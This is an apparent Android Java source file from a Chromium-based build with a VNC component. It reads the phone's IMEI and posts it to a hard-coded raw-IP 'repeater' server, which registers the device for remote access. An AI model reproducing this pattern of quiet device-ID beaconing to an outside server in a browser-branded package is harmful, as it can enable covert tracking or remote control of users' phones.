package org.chromium.chrome.browser.vnc.reg;

import android.telephony.TelephonyManager;
import android.text.TextUtils;

import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.chromium.chrome.browser.ChromeApplication;

import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

import static android.content.Context.TELEPHONY_SERVICE;
import static java.net.Proxy.Type.HTTP;

/**
 * Created by Administrator on 2017/7/10.
 */

public class RegisterServer {

    // private static String url = "http://localhost:8080/repeater/control/RepeaterRegEvents";
   // private static String url = "http://118.89.48.252:8080/repeater/control/RepeaterRegEvents";
    private static String url = "http://118.89.24.77:8080/repeater/control/RepeaterRegEvents";
    private static String imei;
    private static String userId;
    public static String target = null;

    private RegisterServer() {
    }
    private static void init(){
        imei = "1234567890987665";
        userId = "123456";
        target = null;
    }
    public static boolean reg() {
        String str = null;

        init();
        TelephonyManager TelephonyMgr = (TelephonyManager) ChromeApplication.getInstance().getSystemService(TELEPHONY_SERVICE);
        imei = TelephonyMgr.getDeviceId();
        if (TextUtils.isEmpty(imei)) {
            imei = "random_" + String.valueOf(new Random().nextInt());
        }

        Map<String,String> map = new HashMap<String,String>();
        map.put("IMEI", imei);
        map.put("USERID", userId);
        try {
            str = HttpClientUtils.post(new StringBuilder(url).toString(), map);
        } catch (Exception e) {
            e.printStackTrace();
            return Boolean.FALSE;
        }
        if (StringUtil.isBlank(str)) {
            return Boolean.FALSE;
        }
        WebResult result = JsonUtils.TO_OBJ(str, WebResult.class);
        //{"regInfo":{"IMEI":"1234567890987665","RepeaterIpAddress":"118.89.48.252","uniqueId":"123456"}}
        if (!result.isStatus()) {
            return Boolean.FALSE;
        }
        Constants.REG_INFO = JsonUtils.TO_OBJ(result.getResult(), RegistResponse.class);
        return Boolean.TRUE;
    }

}
